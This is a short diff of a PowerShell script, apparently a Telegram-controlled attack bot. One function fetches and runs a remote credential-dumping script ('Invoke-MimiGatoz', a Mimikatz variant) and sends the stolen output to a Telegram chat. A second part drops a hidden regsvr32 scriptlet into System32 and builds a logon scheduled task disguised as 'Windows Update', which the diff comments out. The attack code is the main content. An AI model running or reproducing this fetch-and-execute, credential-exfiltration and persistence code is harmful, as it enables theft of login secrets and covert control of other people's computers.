@@ -179,7 +179,7 @@ $Usuario = "Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privile
 
 function mimigatoz {
 $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta_temp = $env:USERPROFILE + "\appdata\local\temp\1" ; $ruta = $ruta + "\mimigatoz.txt" ; $ruta_ps1 = $ruta -replace ".txt", ".ps1"
-(curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content | Out-File $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta
+(curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content | Out-File $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta ; cat $ruta
 bot-send -file $ruta -botkey $botkey -chat_id $chat_id
 Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
 }
@@ -213,7 +213,7 @@ command = "' + $code + '"
 objShell.Run command,0
 Set objShell = Nothing'
 $plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
-$accion = New-ScheduledTaskAction -Execute "c:\windows\system32\regsvr32.exe" -Argument "/s /n /u /i:c:\windows\system32\update.sct scrobj.dll"
+#$accion = New-ScheduledTaskAction -Execute "c:\windows\system32\regsvr32.exe" -Argument "/s /n /u /i:c:\windows\system32\update.sct scrobj.dll"
 #$desencadenante = New-ScheduledTaskTrigger -AtLogOn
 #$tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet -Hidden)
 #$tarea | Register-ScheduledTask -TaskName "Windows Update" | Out-Null; $texto = ""
